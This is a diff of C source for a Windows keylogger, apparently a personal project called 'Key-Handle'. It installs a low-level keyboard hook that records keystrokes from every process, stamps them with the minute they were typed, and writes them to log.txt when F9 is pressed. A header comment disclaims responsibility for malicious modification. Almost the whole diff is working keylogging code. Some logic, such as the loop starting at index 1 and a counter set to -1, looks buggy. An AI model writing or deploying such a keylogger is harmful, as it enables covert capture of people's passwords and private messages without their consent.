@@ -1,3 +1,10 @@
+/* A program that runs in the background and hooks keyboard input
+ * from all processes. I (alta) am not responsible for any malicious
+ * modification that is made to this code.
+ * 
+ * @author: https://github.com/alta-sh
+ */
+
 #include <Windows.h>
 #include <inttypes.h>
 #include <stdio.h>
@@ -24,83 +31,87 @@ uint_fast16_t keyCount = 0;
 
 HWND window;
 
-
 struct Message {
     char message[MESSAGE_BUFFER_SIZE];
-    time_t messageTime;
-    struct tm* timeinfo;
+    int hours;
+    int minutes;
 };
 
-struct Message messages[MESSAGE_BUFFER_SIZE];
+struct Message messages[120];
 
 /* The hook procedure */
 LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-
     PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
     DWORD lastKeyPressed = key->vkCode;
 
     /* Intercepting the input msg */
     if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
         
+        time_t timeOfKey = time(&timeOfKey);
+        struct tm* timeOfKeyInfo = localtime(&timeOfKey);
+        time(&timeOfKey);
+        timeOfKeyInfo = localtime(&timeOfKey);
+
         if(isExitKeyPressed(lastKeyPressed)) {
             ShowWindow(window, 1);
             puts("Writing to file...");
             MessageBeep(0xFFFFFF);
             Sleep(1000);
+            getchar();
             terminateProgram();
         }
 
         static bool updateTime = true;
-        fflush(stdout);
 
         if(updateTime) {
-            time(&messages[messageCount].messageTime);
-            messages[messageCount].timeinfo = localtime(&messages[messageCount].messageTime);
+            messages[messageCount].hours = timeOfKeyInfo->tm_hour;
+            messages[messageCount].minutes = timeOfKeyInfo->tm_min;
             updateTime = false;
         }
 
         messages[messageCount].message[keyCount] = (char)lastKeyPressed;
-          
-        time_t timeOfKey = time(&timeOfKey);
-        struct tm* timeOfKeyInfo = localtime(&timeOfKey);
-
-        if(timeOfKeyInfo->tm_min != messages[messageCount].timeinfo->tm_min) {
+        
+        if(messages[messageCount].minutes != timeOfKeyInfo->tm_min) {
+            messages[messageCount].message[keyCount + 1] = '\0';
+            fflush(stdout);
+            printf("Message %d:\n%s", messageCount, messages[messageCount].message);
             messageCount++;
+            keyCount = -1;
             updateTime = true;
         }
-
         keyCount++;
     }
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
-void clear() {
-    system("cls");
-}
+
+void clear() { system("cls"); }
+
 
 bool isExitKeyPressed(DWORD key) {
     if(key == VK_F9) { return true; }
     return false;
 }
 
+
 void terminateProgram() {
      /* Write to file */
         FILE* fp;
         fp = fopen("log.txt", "w");     
 
-        fprintf(fp, "number of messages: %d\n", messageCount);
+        fprintf(fp, "Log results for the past %d minutes:\n", messageCount);
 
         for(size_t i = 1; i <= messageCount; i++) {
             fprintf(fp, "\n<%02d:%02d> %s",
-                    messages[i].timeinfo->tm_hour,
-                    messages[i].timeinfo->tm_min,
+                    messages[i].hours,
+                    messages[i].minutes,
                     messages[i].message);
         }
-        
         fflush(fp);
         fclose(fp);
         exit(0);
 }
+
 
 void handleDirectory() {
     clear();
@@ -108,6 +119,7 @@ void handleDirectory() {
     getchar();
     renderMenu();
 }
+
 
 void renderMenu() { 
     printf("\n[ Key-Handle ] - By alta\n\n"
@@ -133,8 +145,8 @@ void renderMenu() {
     }
 }
 
+
 int main(int argc, char* argv[]) {
-    
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
 
